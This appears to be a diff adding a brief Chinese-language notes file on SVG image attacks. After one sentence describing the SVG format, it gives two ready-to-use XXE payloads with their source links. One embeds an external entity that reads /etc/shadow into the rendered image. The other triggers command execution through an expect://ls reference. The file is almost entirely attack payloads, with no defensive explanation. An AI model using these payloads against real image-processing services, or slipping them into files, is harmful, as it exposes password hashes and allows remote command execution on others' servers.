@@ -1,0 +1,20 @@
+SVG(Scalable Vector Graphics)是一种基于XML的二维矢量图格式，和我们平常用的jpg/png等图片格式所不同的是SVG图像在放大或改变尺寸的情况下其图形质量不会有所损失，并且我们可以使用任何的文本编辑器打开SVG图片并且编辑它，目前主流的浏览器都已经支持SVG图片的渲染
+
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE note [
+<!ENTITY file SYSTEM "file:///etc/shadow" >
+]>
+<svg height="100" width="1000">
+  <text x="10" y="20">&file;</text>
+</svg>
+
+
+来源 https://www.rootnetsec.com/bsidessf-svgmagick/
+
+
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
+    <image xlink:href="expect://ls"></image>
+</svg>
+
+来源 https://github.com/payloadbox/xxe-injection-payload-list
